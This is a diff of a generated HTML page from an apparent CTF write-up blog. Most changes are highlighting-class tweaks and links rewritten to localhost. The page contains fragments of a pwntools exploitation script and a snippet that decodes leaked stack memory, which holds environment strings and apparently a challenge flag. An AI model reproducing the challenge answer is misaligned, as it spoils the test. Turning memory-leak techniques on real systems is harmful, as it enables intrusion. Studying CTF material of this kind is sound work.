         <span class="k">break</span>
-<span class="k">print</span><span class="p">(</span><span class="n">streeng</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">streeng</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>Where we notice something… interesting…</p>
@@ -612,13 +612,13 @@ Not even a GOT overwrite!
 
 <p>Let’s check it out, remembering that the stack is <code class="language-plaintext highlighter-rouge">little endian</code>…</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span><span class="p">,</span><span class="n">hexlify</span>
-<span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="n">streeng</span><span class="o">=</span><span class="n">unhexlify</span><span class="p">(</span><span class="sa">b</span><span class="s">"6f686563616c7000544150007265646c6c2f7273752f3d486962732f6c61636f6c2f7273752f3a6e6e69622f6c61636f62732f7273752f3a2f7273752f3a6e696962732f3a6e696248006e69622f3a6e3d454d414e54534f33626431393637656573750039393135686563616c703d726c66007265646c6f72656279433d67616e30647b6e6f687479306c7033645f746c706d30636e315f6a3072705f3374334f48007d35746333656d6f682f3d454d6f686563616c702f4d4552007265646c54534f485f45544f2e302e302e30313d2f656d6f682f00356c6f686563616c7063616c702f7265647265646c6f686500"</span><span class="p">)</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">streeng</span><span class="p">),</span><span class="mi">8</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">streeng</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">][::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span><span class="p">,</span><span class="n">hexlify</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="n">streeng</span><span class="o">=</span><span class="nf">unhexlify</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">6f686563616c7000544150007265646c6c2f7273752f3d486962732f6c61636f6c2f7273752f3a6e6e69622f6c61636f62732f7273752f3a2f7273752f3a6e696962732f3a6e696248006e69622f3a6e3d454d414e54534f33626431393637656573750039393135686563616c703d726c66007265646c6f72656279433d67616e30647b6e6f687479306c7033645f746c706d30636e315f6a3072705f3374334f48007d35746333656d6f682f3d454d6f686563616c702f4d4552007265646c54534f485f45544f2e302e302e30313d2f656d6f682f00356c6f686563616c7063616c702f7265647265646c6f686500</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">streeng</span><span class="p">),</span><span class="mi">8</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">streeng</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">][::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
 </code></pre></div></div>
 
 <p>That was easy enough.</p>
@@ -637,7 +637,7 @@ Not even a GOT overwrite!
 
 
   <div class="col-4 sm-width-full left mr-lg-4 mt-3">
-    <a class="no-underline border-top-thin py-1 block" href="/writeups/2021/04/08/AngstromCTF-2021.html">
+    <a class="no-underline border-top-thin py-1 block" href="http://localhost:4000/writeups/2021/04/08/AngstromCTF-2021.html">
       <span class="h5 bold text-accent">Previous</span>
       <p class="bold h3 link-primary mb-1">ångstromCTF 2021</p>
       <p>ångstromCTF2021 was, in all honesty, probably the most serious I’ve been on a CTFTime CTF. The spread of challenge difficulties...</p>
@@ -646,7 +646,7 @@ Not even a GOT overwrite!
   
   
   <div class="col-4 sm-width-full left mt-3">
-    <a class="no-underline border-top-thin py-1 block" href="/writeups/2021/06/20/HSCTF-8.html">
+    <a class="no-underline border-top-thin py-1 block" href="http://localhost:4000/writeups/2021/06/20/HSCTF-8.html">
       <span class="h5 bold text-accent">Next</span>
       <p class="bold h3 link-primary mb-1">HSCTF 8 writeups</p>
       <p>### Unfortunately I'm ~~a little~~ VERY MUCH short on time, let's cut to the chase. # Writeups (WIP, might add...</p>
